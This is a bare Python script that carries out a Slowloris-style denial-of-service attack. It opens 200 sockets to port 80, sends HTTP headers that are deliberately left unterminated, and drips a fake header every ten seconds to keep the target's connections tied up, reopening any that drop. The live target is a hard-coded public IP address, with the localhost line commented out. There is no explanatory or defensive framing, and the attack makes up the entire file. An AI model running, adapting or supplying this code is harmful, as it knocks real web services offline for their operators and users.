import socket
import random
import time
import threading

# HOST = "127.0.0.1"
HOST = "185.158.133.1"
PORT = 80
SOCKET_COUNT = 200
KEEPALIVE_INTERVAL = 10  # seconds

def build_initial_request():
    return (
        f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Accept-language: en-US,en\r\n"
        # deliberately NO trailing \r\n -> headers never terminate
    )

def build_keepalive_header():
    return f"X-a: {random.randint(1, 5000)}\r\n"

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((HOST, PORT))
    s.send(build_initial_request().encode("utf-8"))
    return s

def main():
    sockets = []

    print(f"[*] Opening {SOCKET_COUNT} sockets to {HOST}:{PORT}")
    for i in range(SOCKET_COUNT):
        try:
            sockets.append(create_socket())
        except socket.error:
            break
    print(f"[*] Established {len(sockets)} connections")

    # Keep them alive, and try to replace dead ones
    while True:
        print(f"[*] Sending keep-alive headers to {len(sockets)} sockets")
        for s in list(sockets):
            try:
                s.send(build_keepalive_header().encode("utf-8"))
            except socket.error:
                sockets.remove(s)

        # Attempt to top back up
        for _ in range(SOCKET_COUNT - len(sockets)):
            try:
                sockets.append(create_socket())
            except socket.error:
                break

        time.sleep(KEEPALIVE_INTERVAL)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped")